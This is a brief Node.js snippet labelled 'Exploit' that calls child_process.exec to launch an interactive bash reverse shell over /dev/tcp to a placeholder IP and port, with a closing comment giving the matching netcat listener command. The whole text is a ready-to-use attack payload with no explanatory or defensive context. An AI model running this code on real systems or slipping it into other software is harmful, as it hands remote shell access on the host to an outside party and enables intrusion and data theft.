/* Exploit */

const { exec } = require('node:child_process')

exec('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"', (err, result) => {
   if (err){
      console.error("Failed:", err)
      return
    }

console.log(result);})


/* Listen: nc -lnvp PORT ==> ~$ Shell */


